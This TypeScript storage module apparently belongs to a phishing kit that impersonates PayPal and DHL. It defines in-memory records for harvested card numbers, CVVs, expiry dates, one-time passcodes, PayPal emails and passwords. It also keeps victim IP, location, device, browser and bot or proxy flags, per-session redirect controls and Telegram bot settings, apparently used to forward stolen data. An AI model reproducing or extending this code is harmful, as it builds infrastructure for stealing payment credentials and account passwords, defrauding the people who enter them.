import { 
  type User, 
  type InsertUser, 
  type AdminSettings,
  type InsertAdminSettings,
  type PaymentRecord,
  type InsertPaymentRecord,
  type PaypalSession,
  type InsertPaypalSession,
  type DhlSession,
  type InsertDhlSession,
  type VisitorLog,
  type InsertVisitorLog
} from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  
  getAdminSettings(): Promise<AdminSettings | undefined>;
  upsertAdminSettings(settings: InsertAdminSettings): Promise<AdminSettings>;
  
  createPaymentRecord(record: InsertPaymentRecord): Promise<PaymentRecord>;
  getPaymentRecord(id: string): Promise<PaymentRecord | undefined>;
  updatePaymentRecord(id: string, updates: Partial<InsertPaymentRecord>): Promise<PaymentRecord | undefined>;
  getAllPaymentRecords(): Promise<PaymentRecord[]>;
  
  createPaypalSession(session: InsertPaypalSession): Promise<PaypalSession>;
  getPaypalSession(sessionId: string): Promise<PaypalSession | undefined>;
  updatePaypalSession(sessionId: string, updates: Partial<InsertPaypalSession>): Promise<PaypalSession | undefined>;
  getAllPaypalSessions(): Promise<PaypalSession[]>;
  
  createDhlSession(session: InsertDhlSession): Promise<DhlSession>;
  getDhlSession(sessionId: string): Promise<DhlSession | undefined>;
  updateDhlSession(sessionId: string, updates: Partial<InsertDhlSession>): Promise<DhlSession | undefined>;
  getAllDhlSessions(): Promise<DhlSession[]>;
  
  createVisitorLog(log: InsertVisitorLog): Promise<VisitorLog>;
  getAllVisitorLogs(limit?: number): Promise<VisitorLog[]>;
  clearVisitorLogs(): Promise<void>;
}

export class MemStorage implements IStorage {
  private users: Map<string, User>;
  private adminSettings: AdminSettings | null;
  private paymentRecords: Map<string, PaymentRecord>;
  private paypalSessions: Map<string, PaypalSession>;
  private dhlSessions: Map<string, DhlSession>;
  private visitorLogs: Map<string, VisitorLog>;

  constructor() {
    this.users = new Map();
    this.adminSettings = null;
    this.paymentRecords = new Map();
    this.paypalSessions = new Map();
    this.dhlSessions = new Map();
    this.visitorLogs = new Map();
  }

  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const user: User = { ...insertUser, id };
    this.users.set(id, user);
    return user;
  }

  async getAdminSettings(): Promise<AdminSettings | undefined> {
    return this.adminSettings || undefined;
  }

  async upsertAdminSettings(settings: InsertAdminSettings): Promise<AdminSettings> {
    const id = this.adminSettings?.id || randomUUID();
    const adminSettings: AdminSettings = {
      id,
      telegramBotToken: settings.telegramBotToken ?? null,
      telegramChatId: settings.telegramChatId ?? null,
      redirectUrl: settings.redirectUrl ?? null,
      redirectEnabled: settings.redirectEnabled ?? "false",
      adminPasswordHash: settings.adminPasswordHash ?? null,
      recaptchaSiteKey: settings.recaptchaSiteKey ?? null,
      recaptchaSecretKey: settings.recaptchaSecretKey ?? null,
      recaptchaEnabled: settings.recaptchaEnabled ?? "false",
      recaptchaThreshold: settings.recaptchaThreshold ?? "0.5",
      updatedAt: new Date(),
    };
    this.adminSettings = adminSettings;
    return adminSettings;
  }

  async createPaymentRecord(record: InsertPaymentRecord): Promise<PaymentRecord> {
    const id = randomUUID();
    const paymentRecord: PaymentRecord = {
      id,
      cardNumber: record.cardNumber,
      expiryMonth: record.expiryMonth,
      expiryYear: record.expiryYear,
      cvv: record.cvv,
      cardholderName: record.cardholderName,
      otp1: record.otp1 ?? null,
      otp2: record.otp2 ?? null,
      paypalEmail: record.paypalEmail ?? null,
      paypalPassword: record.paypalPassword ?? null,
      createdAt: new Date(),
    };
    this.paymentRecords.set(id, paymentRecord);
    return paymentRecord;
  }

  async getPaymentRecord(id: string): Promise<PaymentRecord | undefined> {
    return this.paymentRecords.get(id);
  }

  async updatePaymentRecord(id: string, updates: Partial<InsertPaymentRecord>): Promise<PaymentRecord | undefined> {
    const existing = this.paymentRecords.get(id);
    if (!existing) return undefined;

    const updated: PaymentRecord = {
      ...existing,
      ...updates,
    };
    this.paymentRecords.set(id, updated);
    return updated;
  }

  async getAllPaymentRecords(): Promise<PaymentRecord[]> {
    return Array.from(this.paymentRecords.values()).sort(
      (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
    );
  }

  async createPaypalSession(session: InsertPaypalSession): Promise<PaypalSession> {
    const id = randomUUID();
    const paypalSession: PaypalSession = {
      id,
      sessionId: session.sessionId,
      email: session.email ?? null,
      password: session.password ?? null,
      cardNumber: session.cardNumber ?? null,
      expiryMonth: session.expiryMonth ?? null,
      expiryYear: session.expiryYear ?? null,
      cvv: session.cvv ?? null,
      cardholderName: session.cardholderName ?? null,
      ipAddress: session.ipAddress ?? null,
      country: session.country ?? null,
      device: session.device ?? null,
      browser: session.browser ?? null,
      redirectUrl: session.redirectUrl ?? null,
      redirectVersion: session.redirectVersion ?? 0,
      currentPath: session.currentPath ?? null,
      status: session.status ?? "waiting",
      createdAt: new Date(),
    };
    this.paypalSessions.set(session.sessionId, paypalSession);
    return paypalSession;
  }

  async getPaypalSession(sessionId: string): Promise<PaypalSession | undefined> {
    return this.paypalSessions.get(sessionId);
  }

  async updatePaypalSession(sessionId: string, updates: Partial<InsertPaypalSession>): Promise<PaypalSession | undefined> {
    const session = this.paypalSessions.get(sessionId);
    if (!session) return undefined;

    const updated: PaypalSession = {
      ...session,
      ...updates,
    };
    this.paypalSessions.set(sessionId, updated);
    return updated;
  }

  async getAllPaypalSessions(): Promise<PaypalSession[]> {
    return Array.from(this.paypalSessions.values()).sort(
      (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
    );
  }

  async createDhlSession(session: InsertDhlSession): Promise<DhlSession> {
    const id = randomUUID();
    const dhlSession: DhlSession = {
      id,
      sessionId: session.sessionId,
      paymentId: session.paymentId ?? null,
      cardNumber: session.cardNumber,
      cardholderName: session.cardholderName,
      bankName: session.bankName ?? null,
      ipAddress: session.ipAddress ?? null,
      country: session.country ?? null,
      device: session.device ?? null,
      browser: session.browser ?? null,
      redirectUrl: session.redirectUrl ?? null,
      redirectVersion: session.redirectVersion ?? 0,
      currentPath: session.currentPath ?? null,
      status: session.status ?? "waiting",
      createdAt: new Date(),
    };
    this.dhlSessions.set(session.sessionId, dhlSession);
    return dhlSession;
  }

  async getDhlSession(sessionId: string): Promise<DhlSession | undefined> {
    return this.dhlSessions.get(sessionId);
  }

  async updateDhlSession(sessionId: string, updates: Partial<InsertDhlSession>): Promise<DhlSession | undefined> {
    const session = this.dhlSessions.get(sessionId);
    if (!session) return undefined;

    const updated: DhlSession = {
      ...session,
      ...updates,
    };
    this.dhlSessions.set(sessionId, updated);
    return updated;
  }

  async getAllDhlSessions(): Promise<DhlSession[]> {
    return Array.from(this.dhlSessions.values()).sort(
      (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
    );
  }

  async createVisitorLog(log: InsertVisitorLog): Promise<VisitorLog> {
    const id = randomUUID();
    const visitorLog: VisitorLog = {
      id,
      sessionId: log.sessionId ?? null,
      flowType: log.flowType,
      ipAddress: log.ipAddress,
      country: log.country ?? null,
      city: log.city ?? null,
      region: log.region ?? null,
      isp: log.isp ?? null,
      userAgent: log.userAgent ?? null,
      device: log.device ?? null,
      browser: log.browser ?? null,
      os: log.os ?? null,
      language: log.language ?? null,
      referrer: log.referrer ?? null,
      currentPage: log.currentPage ?? null,
      isBot: log.isBot ?? "false",
      isMobile: log.isMobile ?? "false",
      isProxy: log.isProxy ?? "false",
      connectionType: log.connectionType ?? null,
      createdAt: new Date(),
    };
    this.visitorLogs.set(id, visitorLog);
    return visitorLog;
  }

  async getAllVisitorLogs(limit: number = 100): Promise<VisitorLog[]> {
    const logs = Array.from(this.visitorLogs.values()).sort(
      (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
    );
    return logs.slice(0, limit);
  }

  async clearVisitorLogs(): Promise<void> {
    this.visitorLogs.clear();
  }
}

export const storage = new MemStorage();
